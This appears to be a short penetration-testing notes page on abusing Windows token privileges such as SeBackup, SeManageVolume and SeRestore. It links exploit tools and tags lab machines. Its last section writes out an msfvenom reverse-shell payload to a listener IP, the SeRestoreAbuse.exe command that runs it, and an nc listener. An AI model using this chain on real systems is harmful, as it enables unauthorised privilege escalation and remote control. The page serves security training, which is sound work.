# Privilege Abuse

{% embed url="https://github.com/gtworek/Priv2Admin" %}

## SeImpersonate

Potatos from Windows PrivEsc

## SeBackup

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}

## SeManageVolume

{% hint style="info" %}
Access \[PG AD]
{% endhint %}

{% embed url="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public" %}

{% embed url="https://sirensecurity.io/blog/dllref/" %}

## SeRestoreAbuse

{% hint style="info" %}
Vault \[PG AD]
{% endhint %}

{% embed url="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" %}

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80`

`.\SeRestoreAbuse.exe C:\Temp\reverse.exe [Absolute path]`

`nc -lvnp 80`
